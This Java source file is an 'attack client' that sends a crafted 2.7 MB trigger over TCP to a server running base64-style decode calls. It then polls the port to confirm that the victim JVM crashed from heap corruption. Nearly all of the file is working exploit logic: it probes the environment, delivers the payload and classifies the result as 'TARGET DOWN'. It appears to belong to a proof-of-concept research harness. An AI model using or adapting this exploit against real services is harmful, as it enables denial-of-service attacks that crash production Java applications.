package com.aweimc.j4shell;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

/**
 * Attack client - pure JDK, no third-party dependencies.
 *
 * Flow:
 *   1. PING         - fetch server environment (java version / triggerLen / layer-1 self-check)
 *   2. FIRE + body  - deliver the full trigger (2,796,161 bytes: 'A'*(len-1) + '=') over TCP;
 *                     the server executes two consecutive single-arg decode(byte[]) calls
 *   3. read verdict (HIT / CONTAMINATED / SURVIVED / EOF - a reset mid-fire is expected on hit)
 *   4. poll PING    - verify whether the victim JVM died (connection refused = TARGET DOWN)
 *
 * Exit codes: 0 = TARGET DOWN (victim JVM crashed); 1 = corruption hit but JVM alive;
 *             2 = survived; 3 = connection/environment error.
 */
public final class J4ShellClient {

    public static int run(String host, int port, int pollMaxMs) {
        long t0 = System.currentTimeMillis();
        try {
            // 1) liveness + environment
            String pong = talk(host, port, "PING\n", 10000);
            if (pong == null) {
                System.out.println("[client] server unreachable at " + host + ":" + port);
                return 3;
            }
            System.out.println("[client] < " + pong);
            int len = parseLen(pong);
            if (len <= 0) return 3;
            if (pong.contains("probe=none")) {
                System.out.println("[client] WARNING: server layer-1 self-check shows NO spill - "
                        + "runtime patched or intrinsics off; attack will not work");
            }

            // 2) deliver trigger and fire (the server may die before replying - a connection
            //    reset mid-fire is an expected signal on a hit)
            System.out.printf("[client] building trigger len=%d (%d 'A' + '=') and firing...%n",
                    len, len - 1);
            byte[] trig = Payload.trigger(len);
            String verdict;
            try {
                verdict = talkWithBody(host, port,
                        ("FIRE " + len + "\n").getBytes(StandardCharsets.US_ASCII), trig, 30000);
            } catch (java.net.SocketException reset) {
                System.out.println("[client] connection reset mid-fire (server side died during decode - expected on hit)");
                verdict = null;
            }
            long fireMs = System.currentTimeMillis() - t0;
            System.out.println("[client] < " + (verdict == null ? "<EOF - connection closed by server>" : verdict));

            // 3) poll to verify JVM liveness
            boolean down = pollDown(host, port, pollMaxMs);
            long totalMs = System.currentTimeMillis() - t0;

            // 4) verdict
            if (down) {
                System.out.printf("[client] *** TARGET DOWN *** JVM crashed (verified: port closed). fire=%dms total=%dms%n",
                        fireMs, totalMs);
                System.out.println("[client] forensics: server logs/hs_err_ddh_pid*.log (EXCEPTION_ACCESS_VIOLATION)");
                if (verdict != null && verdict.startsWith("HIT")) {
                    System.out.println("[client] evidence chain complete: network payload -> HIT reply -> JVM dead");
                } else {
                    System.out.println("[client] evidence chain: network payload -> connection reset -> JVM dead "
                            + "(crash before reply; forensics = server console + hs_err log)");
                }
                return 0;
            }
            if (verdict != null && verdict.startsWith("HIT")) {
                System.out.println("[client] hit confirmed but JVM alive - check server console for forced-crash trace");
                return 1;
            }
            if (verdict != null && verdict.startsWith("CONTAMINATED")) {
                System.out.println("[client] heap contaminated, JVM alive (header intact; may crash at next GC)");
                return 1;
            }
            System.out.println("[client] SURVIVED - no corruption observed this run "
                    + "(negative control should match; if miss, tune -Xmx/grid/region and retry)");
            return 2;
        } catch (Exception e) {
            System.out.println("[client] error: " + e);
            return 3;
        }
    }

    // ---------- helpers ----------

    private static int parseLen(String pong) {
        int i = pong.indexOf("triggerLen=");
        if (i < 0) return -1;
        int j = i + "triggerLen=".length();
        int k = j;
        while (k < pong.length() && Character.isDigit(pong.charAt(k))) k++;
        return Integer.parseInt(pong.substring(j, k));
    }

    private static boolean pollDown(String host, int port, int maxMs) throws InterruptedException {
        long deadline = System.currentTimeMillis() + maxMs;
        while (System.currentTimeMillis() < deadline) {
            Thread.sleep(500);
            try (Socket s = new Socket()) {
                s.connect(new InetSocketAddress(host, port), 800);
                try (OutputStream out = s.getOutputStream()) {
                    out.write("PING\n".getBytes(StandardCharsets.US_ASCII));
                    out.flush();
                }
            } catch (Exception refused) {
                return true;    // connection refused/failed = port dead = JVM crashed
            }
        }
        return false;
    }

    private static String talk(String host, int port, String cmd, int timeoutMs) throws Exception {
        try (Socket s = new Socket()) {
            s.connect(new InetSocketAddress(host, port), timeoutMs);
            s.setTcpNoDelay(true);
            OutputStream out = s.getOutputStream();
            out.write(cmd.getBytes(StandardCharsets.US_ASCII));
            out.flush();
            return J4ShellServer.readLine(s.getInputStream());
        }
    }

    private static String talkWithBody(String host, int port, byte[] head, byte[] body, int timeoutMs) throws Exception {
        try (Socket s = new Socket()) {
            s.connect(new InetSocketAddress(host, port), timeoutMs);
            s.setTcpNoDelay(true);
            OutputStream out = s.getOutputStream();
            out.write(head);
            out.write(body);    // full ~2.7MB trigger delivered over the network
            out.flush();
            return J4ShellServer.readLine(s.getInputStream());
        }
    }
}
